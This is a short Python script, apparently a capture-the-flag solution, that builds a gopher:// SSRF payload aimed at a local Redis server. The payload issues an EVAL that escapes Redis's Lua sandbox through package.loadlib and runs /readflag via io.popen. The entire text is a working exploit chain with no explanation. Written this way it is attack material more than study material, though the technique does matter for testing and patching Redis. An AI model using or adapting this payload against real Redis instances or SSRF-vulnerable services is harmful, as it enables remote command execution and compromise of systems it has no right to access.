redis_cmd = """eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io = io_l(); local f = io.popen("/readflag", "r"); local res = f:read("*a"); f:close(); return res' 0
quit"""
gopherPayload = "gopher://127.0.0.1:6379/_%s" % redis_cmd.replace('\r','').replace('\n','%0D%0A').replace(' ','%20')
print(gopherPayload)
